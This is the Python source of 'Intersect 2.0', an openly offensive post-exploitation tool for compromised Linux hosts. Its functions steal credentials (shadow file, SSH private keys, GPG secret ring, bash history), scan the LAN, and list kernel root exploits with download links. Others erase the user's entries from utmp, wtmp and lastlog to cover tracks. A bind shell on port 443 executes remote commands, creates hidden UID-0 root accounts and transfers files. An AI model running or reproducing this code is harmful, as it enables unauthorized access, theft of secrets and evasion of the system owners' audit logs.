#!/usr/bin/python
# intersect 2.0 | created by ohdae
# email: bindshell[at]live[dot]com
# twitter: @ohdae
# http://github.com/ohdae/Intersect-2.0/ || http://bind.shell.la/projects/Intersect
#
# To see the full description of Intersect 2.0, view the attached ReadMe file.
# The ToDo-List will be updated frequently to show changes, upcoming features, bug fixes, etc.
#
# If you find any bugs or have any suggestions or comments, please contact the developer!
#
#-------------------------------------------------------------------------------------------------
#   Copyright (C) 2012  ohdae | bindshell@live.com
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#--------------------------------------------------------------------------------------------------

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import shutil
import getopt
import tarfile
import socket
import string
import random, string
import logging
import struct
import getpass
import pwd

cut = lambda s: str(s).split("\0",1)[0]

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    print "Python module Scapy not installed. You must have this to use the --live-hosts option."

def usage():
    
   __version__ = "version 2.0 - full edition"
   __author__ = "ohdae"
   __website__ = "http://bind.shell.la"
   
   print("=====================================================")                                                                    
   print("       intersect 2.0 | automated post-exploitation")
   print("                "+__version__+"                ")
   print("               "+__author__+" | "+__website__)
   print("=====================================================")
   print("\nFeatures:")
   print("  -d --daemon         run Intersect as a background process")
   print("  -o --os-info        os/distro, users, devices, cronjobs, installed apps, etc")
   print("  -n --network        detailed network info")
   print("  -l --live-hosts     find live hosts on network")
   print("  -c --credentials    locate and save user/system credentials")
   print("  -p --protection     locate commonly installed AV, FW's and extras")
   print("  -a --all-tests      run all local tests and tar reports *scapy required")
   print("  -t --tar            make archive of final reports")
   print("  -s --scrub          scrubs current user/ip from utmp, wtmp & lastlog")
   print("  -b --bind           opens bindshell on port 443")  
   print("  -h --help           prints this menu")
   print("usage: ./intersect.py --daemon --network --protection")
   print("       ./intersect.py --all-tests\n")

def environment():
   global Home_Dir
   global Temp_Dir
   global kernel
   global distro
   global User_Ip_Address
   global UTMP_STRUCT_SIZE    
   global LASTLOG_STRUCT_SIZE
   global UTMP_FILEPATH      
   global WTMP_FILEPATH       
   global LASTLOG_FILEPATH   
   
   fullkernel = os.uname()[2]
   splitkern = fullkernel.split("-")
   kernel = splitkern[0]
   distro = os.uname()[1]
   arch = os.uname()[4]
 
   if os.geteuid() != 0:
        print("[*] This script *must* be executed as root. If not, there will be errors and/or crashes.")
        print("[*] Intersect will now check this kernel for possible privilege escalation exploits.\n     We will find your kernel version and display a list of exploits for that kernel, if available.")
        exploitCheck()
        print("[+] The exploits above *might* allow you to gain root access.")
        print("[+] Intersect cannot be executed as a non-root user. Please run again while root.")
        sys.exit()
   else:
        pass

   Home_Dir = os.environ['HOME']
   User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
   Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
   Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir

   # Setup our signal handler
   signal.signal(signal.SIGINT, signalHandler)
   
   # You *might* have to change these: 
   # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
   UTMP_STRUCT_SIZE    = 384
   LASTLOG_STRUCT_SIZE = 292
   UTMP_FILEPATH       = "/var/run/utmp"
   WTMP_FILEPATH       = "/var/log/wtmp"
   LASTLOG_FILEPATH    = "/var/log/lastlog"
   
   os.system("clear")

   print("[+] Creating temporary working environment....")
   os.chdir(Home_Dir)
   if os.path.exists(Temp_Dir) is True:
       os.system("rm -rf "+Temp_Dir)
   if os.path.exists(Temp_Dir) is False:
       os.mkdir(Temp_Dir)

   print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
  print("[!] Ctrl-C caught, shutting down now");
  Shutdown()

  
def Shutdown():
  if not os.listdir(Temp_Dir):
    os.rmdir(Temp_Dir)


def Gather_OS():
   print("[+] Collecting operating system and user information....")
   os.mkdir(Temp_Dir+"/osinfo/")
   os.mkdir(Temp_Dir+"/configs/")
   os.chdir(Temp_Dir+"/osinfo/")
   
   proc = Popen('ps aux',
                shell=True, 
                stdout=PIPE,
                )
   output = proc.communicate()[0]
   file = open("ps_aux.txt","a")
   for items in output:
       file.write(items),
   file.close()

   os.system("ls -alh /usr/bin > bin.txt")
   os.system("ls -alh /usr/sbin > sbin.txt")
   os.system("ls -al /etc/cron* > cronjobs.txt")
   os.system("ls -alhtr /media > media.txt")

   if distro == "ubuntu":
      os.system("dpkg -l > dpkg_list.txt")
   elif distro == "arch":
      os.system("pacman -Q > pacman_list.txt")
   elif distro == "slackware":
      os.system("ls /var/log/packages > packages_list.txt")
   else:
      print("[!] Package manager not supported. Listings of /usr/bin and /usr/sbin will still be provided.")
   
   if distro == "arch":
      os.system("egrep '^DAEMONS' /etc/rc.conf > services_list.txt")
   elif distro == "slackware":
      os.system("ls -F /etc/rc.d | grep \'*$\' > services_list.txt")
   else:
      print("[!] Unable to retrieve services: This Linux distro may not be fully supported by Intersect")

   os.system("mount -l > mount.txt")
   os.system("cat /etc/sysctl.conf > sysctl.txt")
   os.system("find /var/log -type f -exec ls -la {} \; > loglist.txt")
   os.system("uname -a > distro_kernel.txt")
   os.system("df -hT > filesystem.txt")
   os.system("free -lt > memory.txt")
   os.system("locate sql | grep [.]sql$ > SQL_locations.txt")
   os.system("find /home -type f -iname '.*history' > HistoryList.txt")
   os.system("cat /proc/cpuinfo > cpuinfo.txt")
   os.system("cat /proc/meminfo > meminfo.txt")
   sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
   content = ''
   for f in sysfiles:
       content = content + '\n' + open(f).read()
   open('SysInfo.txt','wb').write(content)
   os.system("rm distro_kernel.txt filesystem.txt memory.txt cpuinfo.txt meminfo.txt")
   os.mkdir("users/")
   os.chdir("users/")
   file = open("CurrentUser.txt" ,"a")
   file.write("\n\nHome Directory: "+ Home_Dir+"\n\n")
   file.close()
   os.system("ls -alhR ~/ > userhome.txt")
   os.system("ls -alhR /home > allusers.txt")
   
   
def GetCredentials():
    # Feature is being rewritten to speed up process and avoid non-root permission issues
    print("[+] Collecting user and system credentials....")
    os.mkdir(Temp_Dir+"/credentials")
    os.chdir(Temp_Dir+"/credentials/")
    os.system('getent passwd > passwd.txt')
    os.system('getent shadow > shadow.txt')
    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
    os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
    content = ''
    for f in sshfiles:
       content = content + '\n' + open(f).read()
    open('SSH_Locations.txt','wb').write(content)
    os.system("rm ssh_locations.txt ssh_contents.txt")

    if os.path.isfile("/etc/master.passwd") is True:
        shutil.copy2("/etc/master.passwd", Temp_Dir+"/credentials/")
    os.system('cat /etc/sudoers > sudoers.txt')
    if os.path.isfile("/etc/ssh/sshd_config") is True:
        shutil.copy2("/etc/ssh/sshd_config", Temp_Dir+"/credentials/") 
    if os.path.isfile(Home_Dir+'/.ssh/id_dsa') is True:
        shutil.copy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
    if os.path.isfile(Home_Dir+'/.ssh/id_dsa.pub') is True:
        shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
    if os.path.isfile(Home_Dir+'/.ssh/id_rsa') is True:
        shutil.copy2(Home_Dir+'/.ssh/id_rsa', Temp_Dir+"/credentials/")
    if os.path.isfile(Home_Dir+'/.ssh/id_rsa.pub') is True: 
        shutil.copy2(Home_Dir+'/.ssh/id_rsa.pub', Temp_Dir+"/credentials/")
    if os.path.isfile(Home_Dir+'/.gnupg/secring.gpg') is True:
        shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
    if os.path.isfile(Home_Dir+"/.ssh/authorized_keys") is True:
        shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
    if os.path.isfile(Home_Dir+"/.ssh/known_hosts") is True:               
        shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
    shutil.copy2(Home_Dir+'/.bash_history', Temp_Dir+"/credentials/bash_history.txt")
    if os.path.isfile("/etc/gshadow") is True:
        shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")

    os.system("lastlog > lastlog.txt")
    os.system("last > last.txt")
    os.system("getent aliases > mail_aliases.txt")

def NetworkInfo():
    # Fix getGateway
   print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
   os.mkdir(Temp_Dir+"/network")
   networkdir = (Temp_Dir+"/network")
   os.chdir(networkdir) 

   proc = Popen('netstat --tcp --listening',
        shell=True,
        stdout=PIPE,
        )
   output = proc.communicate()[0]

   file = open("nstat.txt","a")
   for items in output:
       file.write(items),
   file.close() 

   os.system("lsof -nPi > lsof.txt")
   ports = ["nstat.txt","lsof.txt"]
   content = ''
   for f in ports:
       content = content + '\n' + open(f).read()
   open('Connections.txt','wb').write(content)
   os.system("rm nstat.txt lsof.txt")
   os.system("iptables -L -n > iptablesLN.txt") 
   os.system("iptables-save > iptables_save.txt")
   os.system("ifconfig -a > ifconfig.txt")
   os.system("hostname -I > localIP.txt && hostname -f > hostname.txt")
   netfiles = ["localIP.txt","hostname.txt","ifconfig.txt"]
   content = ''
   for f in netfiles:
       content = content + '\n' + open(f).read()
   open('NetworkInfo.txt','wb').write(content)
   os.system("rm localIP.txt hostname.txt ifconfig.txt")

   if os.path.exists("/etc/hosts.deny") is True:
       shutil.copy2("/etc/hosts.deny", networkdir)
   if os.path.exists("/etc/hosts.allow") is True:
       shutil.copy2("/etc/hosts.allow", networkdir)
   if os.path.exists("/etc/inetd.conf") is True:
       shutil.copy2("/etc/inetd.conf", networkdir)
               
def NetworkMap():
   # Combine ARP then portscan. Send IPs to list and iterate through for the scan
   # Add service identification via socket for all open ports
   # Add traceroute after finding live hosts. Send all results to graph report.
   
    print("[+] Searching for live hosts...")
    os.mkdir(Temp_Dir+"/hosts")
    os.chdir(Temp_Dir+"/hosts")
    conf.verb=0
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
    file = open("livehosts.txt", "a")
    file.write("LAN IP Range: 192.168.1.0/24\n\n")
    for snd,rcv in ans:
        mac_address=rcv.sprintf("%Ether.src%")
        ip_address=rcv.sprintf("%ARP.psrc%")
        #print rcv.sprintf("\n\n[+] Live Host\nMAC %Ether.src%\nIP: %ARP.psrc%\n ")
        file.write("\n\n[+] Live Host\nIP: "+ip_address + " MAC"+ mac_address + "\n")
    file.write("\n")
    file.close

# --------------- ARP scan then SYN scan each live IP ---------------------------------
#print("[-] Searching for live hosts...")
#ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
#for snd,rcv in ans:
    #mac_address=rcv.sprintf("%Ether.src%")
    #ip_address=rcv.sprintf("%ARP.psrc%")
    #alives = ["%ARP.psrc%" in ans]
    #print rcv.sprintf("\n[+] Live Host\nMAC %Ether.src%\nIP: %ARP.psrc%")
   
#file.write("\n\n[+] Live Host\nIP: "+ip_address + " MAC"+ mac_address + "\n")

#ip = sys.argv[1]

#conf.verb=1
#for p in alives: ip=IP(p[1])   
#tcp = TCP(dport=[21,22,23,80,1433],sport=[53],flags="S",seq=40)
#ans,unans = sr(ip/tcp)
    
#for sent,rcvd in ans:
   #if not rcvd or rcvd.getlayer(TCP).flags != 0x12:
      #print str(sent.dport)+" : closed"
   #else:
      #services = socket.getservbyport(sent.dport)
      #print str(sent.dport)+" "+services+" : open"
      
  #-----------------------------------Traceroute ---------------------------------------------    
  #res,unans = traceroute(["target"],dport=[{"open ports from scan or port 80"}],maxttl=20,retry=-2
  #
  #
  #------------------------------Get MAC addr-------------------------------------------------
  ## Don't need this snippet yet but it's here so I don't lose it
  #
  # data = commands.getoutput("ifconfig " + iface)
  #  words = data.split()
  #  found = 0
  #  for x in words:
        #print x
  #      if found != 0:
  #         mac = x
  #          break
  #      if x == "HWaddr":
  #          found = 1
  #  if len(mac) == 0:
  #      mac = 'Mac not found'
  #  mac = mac[:17]
  #  print mac
    
def FindProtect():
    # check ToDo-List for additional changes
    # The os.system command runs all at once and is not efficient at all
    # This is just a temporary way of doing it while I finish rewriting this feature and
    # add the rest of the applications that we try to find. 
    
    print("[+] Finding system protection applications....")
    os.mkdir(Temp_Dir+"/protection")
    protectiondir = (Temp_Dir+"/protection")
    os.chdir(protectiondir)
    #if os.path.exists("/etc/snort/snort.conf") is True:
    #    shutil.copy2("/etc/snort/snort.conf", Temp_Dir+"/configs/")
    print("[+] Serching for misc extras (netcat, perl, gcc, tcpdump, etc)....")
    os.system("""
    whereis truecrypt > tc.txt && whereis bulldog > bulldog.txt && whereis ufw > ufw.txt && 
    whereis iptables > ipt.txt && whereis logrotate.txt > logr.txt && whereis logwatch > logw.txt && 
    whereis chkrootkit > chkrt.txt && whereis clamav > clamav.txt && whereis snort > snort.txt &&
    whereis firestarter > firestarter.txt && whereis avast > avast.txt && whereis tiger > tiger.txt &&
    whereis lynis > lynis.txt && whereis rkhunter > rkhunt.txt && whereis tcpdump > tcpd.txt &&
    whereis perl > perl.txt && whereis nc > nc.txt && whereis nc6 > nc6.txt && whereis webmin > webmin.txt &&
    whereis python > pyth.txt && whereis gcc > gcc.txt && whereis jailkit > jailkit.txt && whereis pwgen > pwg.txt &&
    whereis proxychains > pxc.txt && whereis bastille > bastille.txt && whereis wireshark > wshark.txt &&
    whereis nmap > nmap.txt
    """)
    extralists = os.listdir('.')
    content = ''
    for f in extralists:
        content = content + '\n' + open(f).read()
    open('FullList','wb').write(content)
    os.system("rm *.txt")

# Scrub the logfiles (utmp, wtmp & lastlog) for the current user and their ip/host.
# Remove their entires and write new files. 
def ScrubLog():  
  try:
    Current_User = os.getlogin()
  except OSError:
    print "[!] Cannot find user in logs. Did you all ready run --scrub ?"
    return
    
  newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
  writeNewFile(UTMP_FILEPATH, newUtmp)
  print "[+] %s cleaned" % UTMP_FILEPATH
  
  newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
  writeNewFile(WTMP_FILEPATH, newWtmp)
  print "[+] %s cleaned" % WTMP_FILEPATH

  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
  writeNewFile(LASTLOG_FILEPATH, newLastlog)
  print "[+] %s cleaned" % LASTLOG_FILEPATH


# This method works both on utmp & wtmp because they have the same struct entries.
# Once it finds an entry with both the username and ip address (or hostname)
# it removes it from the new w/utmp file.
#
# filePath The fullpath w/filename and extension to read from
# 
# returns A new w/utmp binary file
def scrubFile(filePath, Current_User):
  newUtmp = ""
  with open(filePath, "rb") as f:
    bytes = f.read(UTMP_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
      if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
	newUtmp += bytes
      bytes = f.read(UTMP_STRUCT_SIZE)
  f.close()
  return newUtmp

# This method is specific to the lastlog file binary format, hence the
# particulat unpack values I had to determine from the C struct. It also
# counts as it iterates the binary entries until it finds the entry that 
# matches the to be hidden users' uid.
#
# filePath The fullpath w/filename and extension to read from
# username The user's pid we are searching for
# 
# returns A new lastlog binary file
def scrubLastlogFile(filePath, Current_User):
  pw  	     = pwd.getpwnam(Current_User)
  uid	     = pw.pw_uid
  idCount    = 0
  newLastlog = ''
  
  with open(filePath, "rb") as f:
    bytes = f.read(LASTLOG_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hh32s256s", bytes)
      if (idCount != uid):
	newLastlog += bytes
      idCount += 1
      bytes = f.read(LASTLOG_STRUCT_SIZE)
  return newLastlog

# Writes a binary file.
#
# filePath     The fullpath w/filename and extension to read from
# fileContents The contents to be written to 'filePath'
def writeNewFile(filePath, fileContents):
  f = open(filePath, "w+b")
  f.write(fileContents)
  f.close()
  
def exploitCheck():
    # Shout out to Bernardo Damele for letting me use this code! Thanks again!
    # Check out his blog at http://bernardodamele.blogspot.com
    # Still need to properly implement this feature. Code works but must add getopt, etc. 

    exploitdb_url = "http://www.exploit-db.com/exploits"
    enlightenment_url = "http://www.grsecurity.net/~spender/enlightenment.tgz"
    
    print "[+] Results for local kernel version %s" % kernel

    found_exploit = False
    exploits = {
                 "do_brk": { "CVE": "2003-0961", "versions": ("2.4.0-2.4.22",), "exploits": (131,) },
                 "mremap missing do_munmap": { "CVE": "2004-0077", "versions": ("2.2.0-2.2.25", "2.4.0-2.4.24", "2.6.0-2.6.2"), "exploits": (160,) },
                 "binfmt_elf Executable File Read": { "CVE": "2004-1073", "versions": ("2.4.0-2.4.27", "2.6.0-2.6.8"), "exploits": (624,) },
                 "uselib()": { "CVE": "2004-1235", "versions": ("2.4.0-2.4.29rc2", "2.6.0-2.6.10rc2"), "exploits": (895,) },
                 "bluez": { "CVE": "2005-1294", "versions": ("2.6.0-2.6.11.5",), "exploits": (4756, 926) },
                 "prctl()": { "CVE": "2006-2451", "versions": ("2.6.13-2.6.17.4",), "exploits": (2031, 2006, 2011, 2005, 2004) }, 
                 "proc": { "CVE": "2006-3626", "versions": ("2.6.0-2.6.17.4",), "exploits": (2013,) },
                 "system call emulation": { "CVE": "2007-4573", "versions": ("2.4.0-2.4.30", "2.6.0-2.6.22.7",), "exploits": (4460,) },
                 "vmsplice": { "CVE": "2008-0009", "versions": ("2.6.17-2.6.24.1",), "exploits": (5092, 5093) },
                 "ftruncate()/open()": { "CVE": "2008-4210", "versions": ("2.6.0-2.6.22",), "exploits": (6851,) },
                 "eCryptfs (Paokara)": { "CVE": "2009-0269", "versions": ("2.6.19-2.6.31.1",), "exploits": (enlightenment_url,) },
                 "set_selection() UTF-8 Off By One": { "CVE": "2009-1046", "versions": ("2.6.0-2.6.28.3",), "exploits": (9083,) },
                 "UDEV < 141": { "CVE": "2009-1185", "versions": ("2.6.25-2.6.30",), "exploits": (8478, 8572) },
                 "exit_notify()": { "CVE": "2009-1337", "versions": ("2.6.0-2.6.29",), "exploits": (8369,) },
                 "ptrace_attach() Local Root Race Condition": { "CVE": "2009-1527", "versions": ("2.6.29",), "exploits": (8678, 8673) },
                 "sock_sendpage() (Wunderbar Emporium)": { "CVE": "2009-2692", "versions": ("2.6.0-2.6.31rc3", "2.4.0-2.4.37.1"), "exploits": (9641, 9545, 9479, 9436, 9435, enlightenment_url) },
                 "udp_sendmsg() (The Rebel)": { "CVE": "2009-2698", "versions": ("2.6.0-2.6.9.2",), "exploits": (9575, 9574, enlightenment_url) },
                 "(32bit) ip_append_data() ring0": { "CVE": "2009-2698", "versions": ("2.6.0-2.6.9",), "exploits": (9542,) },
                 "perf_counter_open() (Powerglove and Ingo m0wnar)": { "CVE": "2009-3234", "versions": ("2.6.31",), "exploits": (enlightenment_url,) },
                 "pipe.c (MooseCox)": { "CVE": "2009-3547", "versions": ("2.6.0-2.6.32rc5", "2.4.0-2.4.37"), "exploits": (10018, enlightenment_url) },
                 "CPL 0": { "CVE": "2010-0298", "versions": ("2.6.0-2.6.11",), "exploits": (1397,) },
                 "ReiserFS xattr": { "CVE": "2010-1146", "versions": ("2.6.0-2.6.34rc3",), "exploits": (12130,) },
                 "Unknown": { "CVE": None, "versions": ("2.6.18-2.6.20",), "exploits": (10613,) },
                 "SELinux/RHEL5 (Cheddar Bay)": { "CVE": None, "versions": ("2.6.9-2.6.30",), "exploits": (9208, 9191, enlightenment_url) },
                 "compat": { "CVE": "2010-3301", "versions": ("2.6.27-2.6.36rc4",), "exploits": (15023, 15024) },
                 "BCM": { "CVE": "2010-2959", "versions": ("2.6.0-2.6.36rc1",), "exploits": (14814,) },
                 "RDS protocol": { "CVE": "2010-3904", "versions": ("2.6.0-2.6.36rc8",), "exploits": (15285,) },
                 "put_user() - full-nelson": { "CVE": "2010-4258", "versions": ("2.6.0-2.6.37",), "exploits": (15704,) },
                 "sock_no_sendpage() - full-nelson": { "CVE": "2010-3849", "versions": ("2.6.0-2.6.37",), "exploits": (15704,) },
                 "ACPI custom_method": { "CVE": "2010-4347", "versions": ("2.6.0-2.6.37rc2",), "exploits": (15774,) },
                 "CAP_SYS_ADMIN": { "CVE": "2010-4347", "versions": ("2.6.34-2.6.37",), "exploits": (15916, 15944) },
                 "econet_sendmsg() - half-nelson": { "CVE": "2010-3848", "versions": ("2.6.0-2.6.36.2",), "exploits": (17787,) },
                 "ec_dev_ioctl() - half-nelson": { "CVE": "2010-3850", "versions": ("2.6.0-2.6.36.2",), "exploits": (17787, 15704) },
                 "ipc - half-nelson": { "CVE": "2010-4073", "versions": ("2.6.0-2.6.37rc1",), "exploits": (17787,) },
               }

    print "\nPossible exploits:"

    for name, data in exploits.items():
        versions = data["versions"] 

        for version_tree in versions:
            if "-" in version_tree:
                min_version, max_version = version_tree.split("-")
            else:
                min_version, max_version = version_tree, version_tree

            if kernel >= min_version and kernel <= max_version:
                cve = data["CVE"]
                exploits = data["exploits"]
                found_exploit = True

                print "\n* Linux Kernel %s Local Root Exploit\n    CVE: CVE-%s\n    Affected Kernels: %s-%s\n    Exploits:\n%s" % (name, cve, min_version, max_version, "\n".join("      %s/%d" % (exploitdb_url, expl) if isinstance(expl, int) else "      %s" % expl for expl in exploits))



def bindShell():
    HOST = ''
    PORT = 443
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    print "[!] Shell bound on 443"
    server.listen(5)
    conn, addr = server.accept()
    print "[!] New Connection: %s" % addr[0]
    conn.send("\nIntersect"+str(os.getcwd())+" $ ")
    
    while True:
        cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             stdin=subprocess.PIPE,
             )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
	     destination = cmd[3:].replace('\n','')
             if os.path.isdir(destination):
	      os.chdir(destination)
	      conn.send("\nIntersect"+str(os.getcwd())+" $ ")
             else:
	      conn.send("[!] Directory does not exist") 
	      conn.send("\nIntersect"+str(os.getcwd())+" $ ")
        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[!] Root account " + acct + " has been created.")   
        elif cmd.startswith('upload'):
            data = conn.recv(1024)
            strip = cmd.split(" ")
            filename = strip[1]
            data = conn.recv(1024)
            filewrite=file(filename, "wb")
            filewrite.write(data)
            filewrite.close()
            if os.path.isfile(filename):
                conn.send("[!] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")
        elif cmd.startswith('download'):
            data = conn.recv(1024)
            strip = cmd.split(" ")
            filename = strip[1]
            if not os.path.isfile(filename):
                conn.send("[!] File not found on host! Check the filename and try again.")
            if os.path.isfile(filename):
                fileopen=file(filename, "rb")
                file_data=""
                for data in fileopen:
                    file_data += data
                    conn.sendall(file_data)
        elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
        elif cmd.startswith('helpme'):
            conn.send(" Intersect TCP Shell | Help Menu \n")
            conn.send("---------------------------------\n")
            conn.send("** download <file> | download file from host\n")
            conn.send("** upload <file>   | upload file to host\n")
            conn.send("** extask <task>   | run Intersect task\n")
            conn.send("** isniff <iface>  | start sniffer on <iface>\n")
            conn.send("** usessh <port>   | enable SSH on <port>\n")
            conn.send("   adduser <name>  | add new root account\n")
            conn.send("   rebootsys       | reboots server system\n")
            conn.send("   helpme          | show this help menu\n")
            conn.send("** = must connect using the Intersect shell client to use this feature.")
            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
        elif proc:
    	    conn.sendall("[!] Error: " + stderr)
            conn.send("\nIntersect"+str(os.getcwd())+" $ ")



def MakeArchive():
    # Full version features option to send reports over ssh/sftp to a remote host of your choice
    print("[!] Generating report archive....This might take a minute or two..")
    os.chdir(Temp_Dir)
    tar = tarfile.open("reports.tar.gz", "w:gz")
    if os.path.exists("credentials") is True:
        tar.add("credentials/")
        os.system("rm -rf credentials/")
        if os.path.exists("network/") is True:
           tar.add("network/")
           os.system("rm -rf network/")
        if os.path.exists("protection/") is True:
           tar.add("protection/")
           os.system("rm -rf protection/")
        if os.path.exists("configs/") is True:
           tar.add("configs/")
           os.system("rm -rf configs/")
        if os.path.exists("osinfo/") is True:
           tar.add("osinfo/")
           os.system("rm -rf osinfo/")
        if os.path.exists("hosts/") is True:
           tar.add("hosts/")
           os.system("rm -rf hosts/")
        print("[!] Archive is located in %s" % Temp_Dir)
    else:
         print("[!] No reports exist to archive!")
    tar.close()
    sys.exit(2)

def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    try: 
        pid = os.fork() 
        if pid > 0:
            # exits first parent
            sys.exit(0) 
    except OSError, e: 
        print >>sys.stderr, "fork one failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1)

    # decouple from parent environment
    os.chdir("/") 
    os.setsid() 
    os.umask(0) 

    # forks the second parent
    try: 
        pid = os.fork() 
        if pid > 0:
            # exit from second parent and print PID so user can watch, kill, whatever
            print "Daemon PID %d" % pid 
            sys.exit(0) 
    except OSError, e: 
        print("[!] Intersect will now run in the background. Check %s for your reports." % Temp_Dir)
        print >>sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1) 

    si = file(stdin, 'r')
    so = file(stdout, 'a+')
    se = file(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())
    

def main(argv):
    try:
        opts, args = getopt.getopt(argv, "dhtonlcpsba", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "scrub", "bind", "all-tests"])
    except getopt.GetoptError, err:
        print str(err) 
        usage()
        Shutdown()
    for o, a in opts:
        if o in ("-d", "--daemon"):
            daemon()
        elif o in ("-h", "--help"):
            usage()
	    Shutdown()
	    sys.exit(2)	
        elif o in ("-t", "--tar"):
            MakeArchive()
        elif o in ("-o", "--os-info"):
            Gather_OS()
        elif o in ("-n", "--network"):
             NetworkInfo()
        elif o in ("-l", "--live-hosts"):
             NetworkMap()
        elif o in ("-c", "--credentials"):
             GetCredentials() 
        elif o in ("-p", "--protection"): 
             FindProtect()
        elif o in ("-s", "--scrub"):
	     ScrubLog()
        elif o in ("-b", "--bind"):
             bindShell()
        elif o in ("-a", "--all-tests"):
             Gather_OS()
             NetworkInfo()
             NetworkMap()
             GetCredentials()
             FindProtect()
             MakeArchive()   
        else:
            assert False, "unhandled option"
    Shutdown()
  
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])

